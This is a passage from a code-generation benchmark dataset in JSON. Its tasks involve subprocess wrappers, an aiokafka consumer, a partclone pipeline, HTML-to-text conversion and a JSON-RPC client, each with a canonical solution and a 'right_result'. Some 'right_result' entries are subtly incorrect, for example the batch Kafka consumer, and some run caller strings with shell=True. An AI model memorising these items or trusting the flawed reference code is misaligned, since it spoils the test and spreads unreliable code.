    "Canonical_solution": "import subprocess\n\nclass Segment:\n    def __init__(self):\n        self.version = None\n\n    def run(self):\n        try:\n            p1 = subprocess.Popen([\"npm\", \"--version\"], stdout=subprocess.PIPE)\n            self.version = p1.communicate()[0].decode(\"utf-8\").rstrip()\n        except OSError:\n            self.version = None\n\n    def get_version(self):\n        return self.version",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\nclass Segment:\n    def __init__(self):\n        self.version = None\n\n    def run(self):\n        try:\n            proc = subprocess.Popen(['npm', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            stdout, stderr = proc.communicate()\n            if proc.returncode == 0:\n                self.version = stdout.decode().strip()\n            else:\n                self.version = None\n        except OSError:\n            self.version = None\n\n    def get_version(self):\n        return self.version"
  },
  {
    "Task_id": 3,
    "Instruction": "Task Description: Implement an asynchronous Kafka consumer in Python using the aiokafka library to subscribe to topics, consume messages, and handle batch processing with configurable timeouts and maximum records.\n\nClass Description: The LogicSubscriber class is an abstract base class that provides core functionality for consuming messages from Kafka topics asynchronously. It handles connection management, message consumption, and error handling. The DefaultSubscriber and BatchSubscriber classes extend this functionality for single-message and batch-message consumption respectively.\n\nAttributes:\n\ntopics: Sequence[str] - List of Kafka topics to subscribe to\ngroup_id: Optional[str] - Consumer group ID for Kafka\nconsumer: Optional[AIOKafkaConsumer] - The aiokafka consumer instance\npartitions: Iterable[TopicPartition] - Specific partitions to consume from\n__connection_args: Dict[str, Any] - Connection arguments for Kafka consumer\n\nMethods:\n\n__init__(*topics: str, group_id: Optional[str], connection_args: Dict[str, Any], partitions: Iterable[TopicPartition], default_parser: AsyncCallable, default_decoder: AsyncCallable) -> None - Initializes the subscriber with topics, group ID, connection args, partitions, and message processing callables.\n\nstart() -> None - Creates and starts the Kafka consumer, subscribing to topics or assigning partitions.\n\nclose() -> None - Stops and cleans up the Kafka consumer.\n\nget_msg() -> MsgType - Abstract method to be implemented by subclasses for retrieving messages.\n\n_consume() -> None - Main consumption loop that processes messages and handles errors.\n\nDefaultSubscriber Methods:\n\nget_msg() -> ConsumerRecord - Retrieves a single message from Kafka.\n\nBatchSubscriber Methods:\n\n__init__(*topics: str, batch_timeout_ms: int, max_records: Optional[int], **kwargs: Any) -> None - Extends initialization with batch-specific parameters.\n\nget_msg() -> Tuple[ConsumerRecord, ...] - Retrieves a batch of messages from Kafka with configurable timeout and maximum records.",
    "Canonical_solution": "from typing import Optional, Iterable, Sequence, Dict, Any, Tuple\nfrom abc import ABC, abstractmethod\nfrom itertools import chain\nimport anyio\nfrom aiokafka import ConsumerRecord, TopicPartition\nfrom aiokafka.errors import ConsumerStoppedError, KafkaError\nfrom faststream.broker.subscriber.usecase import SubscriberUsecase\nfrom faststream.broker.types import AsyncCallable, BrokerMiddleware, MsgType\nfrom faststream.broker.utils import process_msg\nfrom faststream.kafka.message import KafkaAckableMessage, KafkaMessage\nfrom faststream.kafka.parser import AioKafkaBatchParser, AioKafkaParser\n\nclass LogicSubscriber(ABC, SubscriberUsecase[MsgType]):\n    topics: Sequence[str]\n    group_id: Optional[str]\n    consumer: Optional[\"AIOKafkaConsumer\"]\n\n    def __init__(\n        self,\n        *topics: str,\n        group_id: Optional[str],\n        connection_args: Dict[str, Any],\n        partitions: Iterable[TopicPartition],\n        default_parser: AsyncCallable,\n        default_decoder: AsyncCallable,\n    ) -> None:\n        super().__init__(\n            default_parser=default_parser,\n            default_decoder=default_decoder,\n        )\n        self.topics = topics\n        self.partitions = partitions\n        self.group_id = group_id\n        self.__connection_args = connection_args\n        self.consumer = None\n\n    async def start(self) -> None:\n        self.consumer = consumer = self.builder(\n            group_id=self.group_id,\n            client_id=self.client_id,\n            **self.__connection_args,\n        )\n\n        if self.topics:\n            consumer.subscribe(topics=self.topics)\n        elif self.partitions:\n            consumer.assign(partitions=self.partitions)\n\n        await consumer.start()\n\n    async def close(self) -> None:\n        if self.consumer is not None:\n            await self.consumer.stop()\n            self.consumer = None\n\n    @abstractmethod\n    async def get_msg(self) -> MsgType:\n        raise NotImplementedError()\n\n    async def _consume(self) -> None:\n        while self.running:\n            try:\n                msg = await self.get_msg()\n                if msg:\n                    await self.consume_one(msg)\n            except KafkaError:\n                await anyio.sleep(5)\n            except ConsumerStoppedError:\n                return\n\nclass DefaultSubscriber(LogicSubscriber[ConsumerRecord]):\n    async def get_msg(self) -> ConsumerRecord:\n        assert self.consumer, \"Consumer not initialized\"\n        return await self.consumer.getone()\n\nclass BatchSubscriber(LogicSubscriber[Tuple[ConsumerRecord, ...]]):\n    def __init__(\n        self,\n        *topics: str,\n        batch_timeout_ms: int,\n        max_records: Optional[int],\n        **kwargs: Any,\n    ) -> None:\n        super().__init__(*topics, **kwargs)\n        self.batch_timeout_ms = batch_timeout_ms\n        self.max_records = max_records\n\n    async def get_msg(self) -> Tuple[ConsumerRecord, ...]:\n        assert self.consumer, \"Consumer not initialized\"\n        messages = await self.consumer.getmany(\n            timeout_ms=self.batch_timeout_ms,\n            max_records=self.max_records,\n        )\n        return tuple(chain(*messages.values())) if messages else ()",
    "Code_level": "Class-level",
    "FSMID_for_test": 80,
    "right_result": "import asyncio\nfrom abc import ABC, abstractmethod\nfrom typing import Any, Dict, Iterable, Optional, Sequence, Tuple, Callable, Awaitable\nfrom aiokafka import AIOKafkaConsumer\nfrom aiokafka.structs import TopicPartition, ConsumerRecord\n\nAsyncCallable = Callable[[Any], Awaitable[Any]]\nMsgType = Any\n\nclass LogicSubscriber(ABC):\n    def __init__(\n        self,\n        *topics: str,\n        group_id: Optional[str] = None,\n        connection_args: Dict[str, Any] = None,\n        partitions: Iterable[TopicPartition] = None,\n        default_parser: AsyncCallable = None,\n        default_decoder: AsyncCallable = None\n    ) -> None:\n        self.topics = topics\n        self.group_id = group_id\n        self.connection_args = connection_args or {}\n        self.partitions = partitions\n        self.default_parser = default_parser\n        self.default_decoder = default_decoder\n        self.consumer: Optional[AIOKafkaConsumer] = None\n\n    async def start(self) -> None:\n        self.consumer = AIOKafkaConsumer(**self.connection_args)\n        await self.consumer.start()\n        if self.topics:\n            await self.consumer.subscribe(topics=list(self.topics))\n        elif self.partitions:\n            await self.consumer.assign(self.partitions)\n\n    async def close(self) -> None:\n        if self.consumer:\n            await self.consumer.stop()\n            self.consumer = None\n\n    @abstractmethod\n    async def get_msg(self) -> MsgType:\n        pass\n\n    async def _consume(self) -> None:\n        try:\n            while True:\n                msg = await self.get_msg()\n                if msg:\n                    print(f\"Consumed message: {msg}\")\n                else:\n                    await asyncio.sleep(0.1)\n        except Exception as e:\n            print(f\"Error in consumption loop: {e}\")\n        finally:\n            await self.close()\n\nclass DefaultSubscriber(LogicSubscriber):\n    async def get_msg(self) -> ConsumerRecord:\n        return await self.consumer.getone()\n\nclass BatchSubscriber(LogicSubscriber):\n    def __init__(\n        self,\n        *topics: str,\n        batch_timeout_ms: int = 200,\n        max_records: Optional[int] = None,\n        **kwargs: Any\n    ) -> None:\n        super().__init__(*topics, **kwargs)\n        self.batch_timeout_ms = batch_timeout_ms\n        self.max_records = max_records\n\n    async def get_msg(self) -> Tuple[ConsumerRecord, ...]:\n        records = await self.consumer.getmany(timeout_ms=self.batch_timeout_ms, max_records=self.max_records)\n        return tuple(records.values()) if isinstance(records, dict) else tuple(records)"
  },
  {
    "Task_id": 300,
    "Instruction": "Task Description: Create a function that executes a shell command using Python's subprocess module and returns the output, error, and process object.\n\nFunction Description: The function SC (Shell Command) takes a shell command as input, executes it using subprocess.Popen, and captures both the standard output and standard error streams. It returns a tuple containing these outputs along with the process object for further interaction if needed.\n\nInput: \n- cmd: [str] - The shell command to be executed as a string.\n\nOutput: \n- Returns a tuple containing:\n  - out: [bytes] - The standard output of the executed command.\n  - err: [bytes] - The standard error of the executed command.\n  - proc: [subprocess.Popen] - The process object representing the executed command.",
    "Canonical_solution": "import os\nimport subprocess\n\ndef SC(cmd):\n    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    [out, err] = proc.communicate()\n    return (out, err, proc)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef SC(cmd):\n    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out, err = proc.communicate()\n    return (out, err, proc)"
  },
  {
    "Task_id": 304,
    "Instruction": "Task Description: Create a function that executes a system command using Python's subprocess module and returns the output.\n\nFunction Description: The function should take a system command as input, execute it in a subprocess, capture the standard output, and return it as a string. The function should handle the process creation, communication, and cleanup automatically.\n\nInput: \n- com: str - A string representing the system command to be executed\n\nOutput:\n- str - The decoded standard output from the executed command",
    "Canonical_solution": "import urllib.request\nimport subprocess\n\ndef excuteCommand(com):\n    ex = subprocess.Popen(com, stdout=subprocess.PIPE, shell=True)\n    out, err = ex.communicate()\n    statusofssh = ex.wait()\n    return out.decode()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\n\ndef execute_command(com):\n    process = subprocess.Popen(com, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)\n    stdout, stderr = process.communicate()\n    return stdout.decode() if stdout else stderr.decode()"
  },
  {
    "Task_id": 305,
    "Instruction": "Task Description: The task involves creating Python functions for executing system commands and processing their output through inter-process communication (IPC) using pipes. The functions should handle command execution, output decoding, and temporary file management for command processing.\n\nFunction Description: The provided functions enable executing system commands through subprocesses, capturing and decoding their output, and processing text data through temporary files when needed. The functions handle Windows-specific configurations and character encoding.\n\nInput:\n- For run_and_read(view, cmd):\n  - view: [Any] - A placeholder parameter (unused in function)\n  - cmd: [str] - The command string to execute via cmd.exe\n\n- For filter_region(view, txt, command):\n  - view: [Any] - A placeholder parameter (unused in function)\n  - txt: [str] - The text content to process\n  - command: [str] - The command to process the text with\n\n- For get_startup_info() and get_oem_cp(): No input parameters\n\nOutput:\n- For run_and_read(): [str] - The decoded output from the command execution\n- For filter_region(): [str] - The processed text output from the command\n- For get_startup_info(): [subprocess.STARTUPINFO] - Windows process startup configuration\n- For get_oem_cp(): [str] - The OEM code page identifier as a string",
    "Canonical_solution": "import subprocess\nfrom subprocess import PIPE\nimport os\nimport tempfile\nimport ctypes\n\ndef get_startup_info():\n    startupinfo = subprocess.STARTUPINFO()\n    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n    return startupinfo\n\ndef run_and_read(view, cmd):\n    out, err = subprocess.Popen(['cmd.exe', '/c', cmd],\n                                stdout=PIPE,\n                                stderr=PIPE,\n                                shell=True,\n                                startupinfo=get_startup_info()).communicate()\n    try:\n        return (out or err).decode(get_oem_cp()).replace('\\r\\n', '\\n')\n    except AttributeError:\n        return ''\n\ndef filter_region(view, txt, command):\n    try:\n        contents = tempfile.NamedTemporaryFile(suffix='.txt', delete=False)\n        contents.write(txt.encode('utf-8'))\n        contents.close()\n\n        script = tempfile.NamedTemporaryFile(suffix='.bat', delete=False)\n        script.write(('@echo off\\ntype %s | %s' % (contents.name, command)).encode('utf-8'))\n        script.close()\n\n        p = subprocess.Popen([script.name],\n                             stdout=PIPE,\n                             stderr=PIPE,\n                             startupinfo=get_startup_info())\n\n        out, err = p.communicate()\n        return (out or err).decode(get_oem_cp()).replace('\\r\\n', '\\n')[:-1].strip()\n    finally:\n        os.remove(script.name)\n        os.remove(contents.name)\n\ndef get_oem_cp():\n    codepage = ctypes.windll.kernel32.GetOEMCP()\n    return str(codepage)",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport sys\nimport tempfile\nimport os\n\ndef run_and_read(view, cmd):\n    proc = subprocess.Popen(['cmd.exe', '/c', cmd], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)\n    out, _ = proc.communicate()\n    return decode_output(out)\n\ndef filter_region(view, txt, command):\n    with tempfile.NamedTemporaryFile(mode='w+', delete=False) as tmpfile:\n        tmpfile.write(txt)\n        tmpfile.flush()\n        try:\n            proc = subprocess.Popen(\n                ['cmd.exe', '/c', command],\n                stdin=subprocess.PIPE,\n                stdout=subprocess.PIPE,\n                stderr=subprocess.PIPE,\n                creationflags=subprocess.CREATE_NO_WINDOW\n            )\n            stdout, stderr = proc.communicate(input=txt.encode(sys.getdefaultencoding()))\n            return decode_output(stdout or stderr)\n        finally:\n            os.unlink(tmpfile.name)\n\ndef get_startup_info():\n    si = subprocess.STARTUPINFO()\n    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW\n    si.wShowWindow = subprocess.SW_HIDE\n    return si\n\ndef get_oem_cp():\n    return 'cp{}'.format(str(getattr(sys.stdout, 'encoding', 'utf-8')).replace('cp', ''))\n\ndef decode_output(output):\n    encodings = [sys.getdefaultencoding(), 'utf-8', 'latin-1']\n    if sys.platform == 'win32':\n        encodings.insert(0, get_oem_cp())\n    for enc in encodings:\n        try:\n            return output.decode(enc)\n        except (UnicodeDecodeError, LookupError):\n            continue\n    return output.decode(sys.getdefaultencoding(), errors='replace')"
  },
  {
    "Task_id": 306,
    "Instruction": "Task Description: Implement a class that interacts with partclone utility to retrieve and parse partition information from disk image files, handling potential compression and chaining multiple subprocesses together.\n\nClass Description: The Partclone class provides static methods for working with partclone disk images, particularly focused on extracting partition information through a chain of subprocess operations.\n\nMethods:\n\nMethod1: get_partclone_info_dict(abs_partclone_image_list: list, image_key: str, compression: str) -> dict - Retrieves partition information from partclone image files by executing a chain of subprocess commands (cat, decompression, and partclone.info). Returns a dictionary containing parsed partition information.\n\nInput:\n- abs_partclone_image_list: List of absolute paths to partclone image files\n- image_key: String identifier for the image\n- compression: String specifying compression type (used for decompression)\n\nOutput:\n- Dictionary containing parsed partition information, with 'filesystem' as a minimum key (set to \"<unknown>\" if parsing fails)\n\nMethod2: parse_partclone_info_output(output: str) -> dict - [Implied but not shown in code] Parses the output string from partclone.info command into a structured dictionary. This would be a helper method called by get_partclone_info_dict.\n\nInput:\n- output: String containing the raw output from partclone.info command\n\nOutput:\n- Dictionary containing structured partition information extracted from the output",
    "Canonical_solution": "import collections\nimport subprocess\n\nclass Partclone:\n    @staticmethod\n    def get_partclone_info_dict(abs_partclone_image_list, image_key, compression):\n        env = utility.Utility.get_env_C_locale()\n        proc = collections.OrderedDict()\n        cat_cmd_list = [\"cat\"] + abs_partclone_image_list\n        decompression_cmd_list = utility.Utility.get_decompression_command_list(compression)\n        partclone_info_cmd_list = [\"partclone.info\", \"--source\", \"-\"]\n        utility.Utility.print_cli_friendly(\"partclone \", [cat_cmd_list, decompression_cmd_list, partclone_info_cmd_list])\n        proc['cat_partclone' + image_key] = subprocess.Popen(cat_cmd_list, stdout=subprocess.PIPE, env=env,\n                                                                          encoding='utf-8')\n        proc['decompression' + image_key] = subprocess.Popen(decompression_cmd_list,\n                                                                          stdin=proc[\n                                                                              'cat_partclone' + image_key].stdout,\n                                                                          stdout=subprocess.PIPE, env=env, encoding='utf-8')\n        proc['partclone_info' + image_key] = subprocess.Popen(partclone_info_cmd_list,\n                                                                           stdin=proc[\n                                                                               'decompression' + image_key].stdout,\n                                                                           stdout=subprocess.PIPE,\n                                                                           stderr=subprocess.PIPE, env=env,\n                                                                           encoding='utf-8')\n        proc['cat_partclone' + image_key].stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n        proc['decompression' + image_key].stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n        output, err = proc['partclone_info' + image_key].communicate()\n        print(\"partclone_info: Exit output \" + str(output) + \"stderr \" + str(err))\n        partclone_info_dict = Partclone.parse_partclone_info_output(err)\n        if len(partclone_info_dict) == 0:\n            print(abs_partclone_image_list[0] + \": Could not read partclone info dict for \" + image_key + \". Treating it as a dd image.\")\n            partclone_info_dict['filesystem'] = \"<unknown>\"\n        return partclone_info_dict",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport logging\n\nclass Partclone:\n    _logger = logging.getLogger(__name__)\n\n    @staticmethod\n    def get_partclone_info_dict(abs_partclone_image_list, image_key, compression):\n        result = {'filesystem': '<unknown>'}\n        try:\n            cat_cmd = ['cat'] + abs_partclone_image_list\n            compression_cmd = []\n            \n            if compression == 'gzip':\n                compression_cmd = ['gunzip', '-c']\n            elif compression == 'bz2':\n                compression_cmd = ['bunzip2', '-c']\n            elif compression == 'xz':\n                compression_cmd = ['unxz', '-c']\n            elif compression == 'lzo':\n                compression_cmd = ['lzop', '-d', '-c']\n            elif compression == 'lz4':\n                compression_cmd = ['lz4', '-d', '-c']\n            elif compression == 'zst':\n                compression_cmd = ['zstd', '--decompress', '--stdout']\n                \n            partclone_cmd = ['partclone.info']\n\n            with subprocess.Popen(cat_cmd, stdout=subprocess.PIPE) as cat_proc:\n                if compression_cmd:\n                    decompress_proc = subprocess.Popen(compression_cmd, stdin=cat_proc.stdout, stdout=subprocess.PIPE)\n                    partclone_proc = subprocess.Popen(partclone_cmd, stdin=decompress_proc.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n                else:\n                    partclone_proc = subprocess.Popen(partclone_cmd, stdin=cat_proc.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n                stdout, stderr = partclone_proc.communicate()\n                \n                if partclone_proc.returncode == 0 and stdout:\n                    output = stdout.decode('utf-8')\n                    result = Partclone.parse_partclone_info_output(output)\n                else:\n                    error_msg = stderr.decode('utf-8') if stderr else \"Unknown error\"\n                    Partclone._logger.error(f\"Error getting partclone info for {image_key}: {error_msg}\")\n                    \n        except Exception as e:\n            Partclone._logger.error(f\"Exception in get_partclone_info_dict for {image_key}: {str(e)}\")\n        \n        return result\n\n    @staticmethod\n    def parse_partclone_info_output(output):\n        result = {'filesystem': '<unknown>'}\n        try:\n            lines = output.split('\\n')\n            for line in lines:\n                if ':' in line:\n                    key, value = line.split(':', 1)\n                    key = key.strip().lower().replace(' ', '_')\n                    value = value.strip()\n                    if key == 'file_system':\n                        key = 'filesystem'\n                    result[key] = value\n        except Exception as e:\n            Partclone._logger.error(f\"Error parsing partclone info output: {str(e)}\")\n        \n        return result"
  },
  {
    "Task_id": 307,
    "Instruction": "Task Description: The task involves creating a function that executes a command in a subprocess, captures its output, and extracts specific metrics from the output for analysis.\n\nFunction Description: The function `run_gpt` executes a given command as a subprocess, captures its standard output and error streams, and parses the output to extract metrics such as runtime, number of parameters, and success status. It then returns these metrics along with any error messages.\n\nInput: \n- `cmd` (str): A string representing the command to be executed in the subprocess.\n\nOutput: \n- A tuple containing:\n  - `runtime` (float): The average iteration time extracted from the output.\n  - `num_params` (float): The number of parameters in billions, rounded to 3 decimal places.\n  - `success` (bool): A boolean indicating whether the test was successful based on a predefined success message.\n  - `errs` (bytes): The error output from the subprocess.",
    "Canonical_solution": "import subprocess\nfrom apex.transformer.testing.commons import TEST_SUCCESS_MESSAGE\n\ndef run_gpt(cmd):\n    args = list(cmd.split(\" \"))\n    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    outs, errs = p.communicate()\n    outs = list(str((outs).decode(\"utf-8\")).splitlines())\n    success = False\n    runtime = 0\n    num_params = 0\n    for out in outs:\n        out = str(out)\n        if \"Average Iteration Time:\" in str(out):\n            slicey = out[out.find(\":\") + 2 :]\n            try:\n                runtime = float(slicey)\n            except:\n                print(slicey)\n                quit()\n        if \"Number of Parameters:\" in str(out):\n            slicey = out[out.find(\":\") + 2 :]\n            try:\n                num_params = int(slicey)\n            except:\n                print(slicey)\n                quit()\n        if str(out) == str(TEST_SUCCESS_MESSAGE):\n            success = True\n    return runtime, round(float(int(num_params)) / 10.0 ** 9, 3), success, errs",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport re\n\ndef run_gpt(cmd):\n    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out, err = process.communicate()\n    \n    runtime_match = re.search(r'average iteration time: (\\d+\\.\\d+)', out.decode())\n    num_params_match = re.search(r'Number of parameters in billions: (\\d+\\.\\d+)', out.decode())\n\n    runtime = float(runtime_match.group(1)) if runtime_match else None\n    num_params = round(float(num_params_match.group(1)), 3) if num_params_match else None\n    \n    success = b\"Test successful!\" in out and not err\n\n    return (runtime, num_params, success, err)"
  },
  {
    "Task_id": 309,
    "Instruction": "Task Description: Convert HTML content to plain text using external command-line tools through subprocess communication.\n\nFunction Description: The function converts HTML data to plain text using either 'lynx' or 'html2text' command-line tools. It handles process creation, input/output communication via pipes, and result processing. The function supports additional options for the conversion tools and ensures proper character encoding.\n\nInput:\n- data: [str] - The HTML content to be converted\n- baseurl: [str] - Base URL for relative links (unused in current implementation)\n- method: [str] - Conversion method ('lynx' or 'html2text')\n- options: [dict] - Additional options to pass to the conversion tool (key-value pairs where value can be None for flag options)\n\nOutput:\n- [str] - The converted plain text content with formatting cleaned up",
    "Canonical_solution": "import re\nimport os\nimport subprocess\nimport logging\n\nlogger = logging.getLogger(__name__)\n\ndef html2text(data, baseurl, method, options):\n    if method == 'lynx':\n        cmd = ['lynx', '-nonumbers', '-dump', '-stdin', '-assume_charset UTF-8', '-display_charset UTF-8']\n    elif method == 'html2text':\n        if '-utf8' in subprocess.check_output(['html2text', '-help'], encoding='utf-8'):\n            cmd = ['html2text', '-nobs', '-utf8']\n        else:\n            cmd = ['html2text', '-nobs']\n    else:\n        raise ValueError('Unknown html2text method: %r' % (method,))\n\n    stdout_encoding = 'utf-8'\n\n    for k, v in options.items():\n        if v is not None:\n            cmd.extend(['-{}'.format(k), '{}'.format(v)])\n        else:\n            cmd.append('-{}'.format(k))\n\n    logger.debug('Command: %r, stdout encoding: %s', cmd, stdout_encoding)\n\n    env = {}\n    env.update(os.environ)\n    env['LANG'] = 'en_US.utf-8'\n    env['LC_ALL'] = 'en_US.utf-8'\n\n    html2text = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, env=env)\n    stdout, stderr = html2text.communicate(data.encode('utf-8'))\n    stdout = stdout.decode(stdout_encoding)\n\n    if method == 'lynx':\n        stdout = re.sub(r'file://%s/[^/]*/' % (os.environ.get('TMPDIR', '/tmp'),), '', stdout)\n        stdout = re.sub(r'file://localhost%s/[^/]*/' % (os.environ.get('TMPDIR', '/tmp'),), '', stdout)\n        stdout = re.sub(r'L\\d+-\\d+TMP.html', '', stdout)\n\n    return stdout.strip()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "right_result": "import subprocess\nimport shlex\n\ndef html_to_text(data, baseurl=None, method='lynx', options=None):\n    if options is None:\n        options = {}\n\n    if method == 'lynx':\n        cmd = ['lynx', '-stdin', '-dump']\n        for key, value in options.items():\n            if value is None:\n                cmd.append(f'-{key}')\n            else:\n                cmd.extend([f'-{key}', str(value)])\n    elif method == 'html2text':\n        cmd = ['html2text']\n        for key, value in options.items():\n            if value is None:\n                cmd.append(f'--{key}')\n            else:\n                cmd.extend([f'--{key}={value}'])\n    else:\n        raise ValueError(\"Unsupported conversion method: {}\".format(method))\n\n    process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = process.communicate(input=data.encode('utf-8'))\n    \n    if process.returncode != 0:\n        raise RuntimeError(\"Conversion failed: {}\".format(stderr.decode('utf-8')))\n    \n    result = stdout.decode('utf-8')\n    return '\\n'.join(line.rstrip() for line in result.splitlines())"
  },
  {
    "Task_id": 31,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for making JSON-RPC requests to a server, handling authentication, connection management, and response processing.\n\nClass Description: The BaseProxy class provides functionality to establish HTTP/HTTPS connections to a JSON-RPC server, send requests with proper authentication, and process responses. It handles connection lifecycle, request formatting, error handling, and response parsing.\n\nAttributes:\n\n__conn: [httplib.HTTPConnection or httplib.HTTPSConnection] - The underlying HTTP connection object\n__service_url: [str] - The complete service URL including protocol, host, port, and path\n__url: [urllib.parse.ParseResult] - Parsed URL components of the service URL\n__id_count: [int] - Counter for JSON-RPC request IDs\n__auth_header: [bytes or None] - Basic authentication header if credentials are provided\n\nMethods:\n\n__init__: [constructor](service_url=None, service_port=None, btc_conf_file=None, timeout=DEFAULT_HTTP_TIMEOUT, connection=None) -> [None] - Initializes the proxy with connection parameters, parses the URL, and sets up authentication\n_call: [_call](service_name, *args) -> [Any] - Makes a JSON-RPC call to the specified service method with given arguments\n_get_response: [_get_response]() -> [dict] - Retrieves and parses the HTTP response from the server\nclose: [close]() -> [None] - Closes the active connection\n__del__: [destructor]() -> [None] - Ensures connection is closed when the object is destroyed",
    "Canonical_solution": "import http.client as httplib\nimport base64\nimport json\nimport urllib.parse as urlparse\n\nDEFAULT_USER_AGENT = \"AuthServiceProxy/0.1\"\nDEFAULT_HTTP_TIMEOUT = 30\n\nclass BaseProxy:\n    def __init__(self, service_url=None, service_port=None, btc_conf_file=None, timeout=DEFAULT_HTTP_TIMEOUT, connection=None):\n        self.__conn = None\n        authpair = None\n\n        if service_url is None:\n            # Configuration and URL setup logic omitted for brevity\n            pass\n        else:\n            url = urlparse.urlparse(service_url)\n            authpair = \"%s:%s\" % (url.username, url.password)\n\n        self.__service_url = service_url\n        self.__url = urlparse.urlparse(service_url)\n\n        if self.__url.scheme not in ('http', 'https'):\n            raise ValueError('Unsupported URL scheme %r' % self.__url.scheme)\n\n        if self.__url.port is None:\n            port = httplib.HTTPS_PORT if self.__url.scheme == 'https' else httplib.HTTP_PORT\n        else:\n            port = self.__url.port\n        self.__id_count = 0\n\n        if authpair is None:\n            self.__auth_header = None\n        else:\n            authpair = authpair.encode('utf8')\n            self.__auth_header = b\"Basic \" + base64.b64encode(authpair)\n\n        if connection:\n            self.__conn = connection\n        else:\n            if self.__url.scheme == 'https':\n                self.__conn = httplib.HTTPSConnection(self.__url.hostname, port=port, timeout=timeout)\n            else:\n                self.__conn = httplib.HTTPConnection(self.__url.hostname, port=port, timeout=timeout)\n\n    def _call(self, service_name, *args):\n        self.__id_count += 1\n\n        postdata = json.dumps({\n            'version': '1.1',\n            'method': service_name,\n            'params': args,\n            'id': self.__id_count\n        })\n\n        headers = {\n            'Host': self.__url.hostname,\n            'User-Agent': DEFAULT_USER_AGENT,\n            'Content-type': 'application/json',\n        }\n\n        if self.__auth_header is not None:\n            headers['Authorization'] = self.__auth_header\n\n        self.__conn.request('POST', self.__url.path, postdata, headers)\n        response = self._get_response()\n        \n        err = response.get('error')\n        if err is not None:\n            if isinstance(err, dict):\n                raise JSONRPCError({\n                    'code': err.get('code', -345),\n                    'message': err.get('message', 'error message not specified')\n                })\n            raise JSONRPCError({'code': -344, 'message': str(err)})\n        elif 'result' not in response:\n            raise JSONRPCError({\n                'code': -343, 'message': 'missing JSON-RPC result'\n            })\n        else:\n            return response['result']\n\n    def _get_response(self):\n        http_response = self.__conn.getresponse()\n        if http_response is None:\n            raise JSONRPCError({\n                'code': -342, 'message': 'missing HTTP response from server'\n            })\n\n        rdata = http_response.read().decode('utf8')\n        try:\n            return json.loads(rdata)\n        except Exception:\n            raise JSONRPCError({\n                'code': -342,\n                'message': ('non-JSON HTTP response with \\'%i %s\\' from server: \\'%.20s%s\\''\n                            % (http_response.status, http_response.reason,\n                               rdata, '...' if len(rdata) > 20 else ''))\n            })\n\n    def close(self):\n        if self.__conn is not None:\n            self.__conn.close()\n\n    def __del__(self):\n        if self.__conn is not None:\n            self.__conn.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "right_result": "import base64\nimport json\nimport logging\nimport sys\nimport urllib.parse\nimport http.client as httplib\n\nDEFAULT_HTTP_TIMEOUT = 30\n\nclass BaseProxy:\n    def __init__(self, service_url=None, service_port=None, btc_conf_file=None, timeout=DEFAULT_HTTP_TIMEOUT, connection=None):\n        self.__conn = connection\n        self.__service_url = service_url or 'http://localhost'\n        self.__url = urllib.parse.urlparse(self.__service_url)\n        self.__id_count = 0\n        self.__auth_header = None\n        \n        if self.__url.username and self.__url.password:\n            auth_str = f'{self.__url.username}:{self.__url.password}'.encode('latin1')\n            self.__auth_header = b'Basic ' + base64.b64encode(auth_str)\n        \n        if not self.__conn:\n            host = self.__url.hostname or 'localhost'\n            port = self.__url.port or service_port or 80\n            is_https = self.__url.scheme == 'https'\n            try:\n                if is_https:\n                    self.__conn = httplib.HTTPSConnection(host, port, timeout=timeout)\n                else:\n                    self.__conn = httplib.HTTPConnection(host, port, timeout=timeout)\n            except Exception as e:\n                logging.error(f\"Failed to create connection: {e}\")\n                raise\n\n    def _call(self, service_name, *args):\n        request_body = json.dumps({\n            \"method\": service_name,\n            \"params\": args,\n            \"jsonrpc\": \"2.0\",\n            \"id\": self.__id_count\n        })\n        self.__id_count += 1\n        \n        headers = {'Content-Type': 'application/json'}\n        if self.__auth_header:\n            headers['Authorization'] = self.__auth_header\n        \n        try:\n            self.__conn.request('POST', self.__url.path or '/', body=request_body, headers=headers)\n            return self._get_response()\n        except Exception as e:\n            logging.error(f\"RPC call failed: {e}\")\n            self.close()\n            raise\n\n    def _get_response(self):\n        response = self.__conn.getresponse()\n        if response.status != 200:\n            raise Exception(f\"HTTP error: {response.status} {response.reason}\")\n        \n        result = json.loads(response.read().decode('utf-8'))\n        if result.get('error'):\n            raise Exception(f\"JSON-RPC error: {result['error']['message']} (Code {result['error']['code']})\")\n        \n        return result['result']\n\n    def close(self):\n        if self.__conn:\n            self.__conn.close()\n            self.__conn = None\n\n    def __del__(self):\n        self.close()"
  },
  {
    "Task_id": 310,
